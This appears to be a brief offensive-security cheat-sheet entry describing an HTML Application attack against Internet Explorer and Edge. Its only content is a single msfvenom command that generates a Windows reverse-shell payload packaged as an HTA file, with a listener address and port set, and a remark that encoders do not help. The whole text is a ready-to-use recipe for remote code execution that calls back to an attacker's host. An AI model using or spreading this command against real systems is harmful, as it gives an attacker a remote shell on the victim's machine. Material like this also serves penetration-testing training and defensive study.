### http application attack(works against Internet Explorer and to some extent Microsoft Edge)
```
1. msfvenom -p windows/shell_reverse_tcp(windows/x64/shell_reverse_tcp) LHOST=10.11.0.4 LPORT=4444 -f hta-psh -o evil.hta(encoders doesnt work)
```
